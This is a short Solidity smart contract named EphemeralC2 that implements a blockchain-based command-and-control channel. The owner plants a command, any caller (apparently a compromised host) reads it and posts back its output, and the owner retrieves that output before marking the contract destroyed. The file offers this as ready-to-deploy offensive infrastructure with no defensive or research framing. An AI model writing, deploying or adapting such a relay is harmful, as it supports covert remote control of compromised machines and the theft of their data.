// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EphemeralC2 {
    address public owner;
    string private command;
    string private output;
    bool public isUsed;
    bool public isDestroyed;

    event CommandRead(address indexed by);
    event OutputWritten(string output, address indexed by);
    event Destroyed(address indexed by);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notDestroyed() {
        require(!isDestroyed, "Contract destroyed");
        _;
    }

    constructor(string memory _command) {
        owner = msg.sender;
        command = _command;
        isUsed = false;
        isDestroyed = false;
    }

    function getCommand() external notDestroyed returns (string memory) {
        emit CommandRead(msg.sender);
        isUsed = true;
        return command;
    }

    function submitOutput(string memory _output) external notDestroyed {
        require(isUsed, "Command not yet read");
        output = _output;
        emit OutputWritten(_output, msg.sender);
    }

    function readOutput() external view onlyOwner notDestroyed returns (string memory) {
        return output;
    }

    function destroy() external onlyOwner {
        isDestroyed = true;
        emit Destroyed(msg.sender);
    }
}
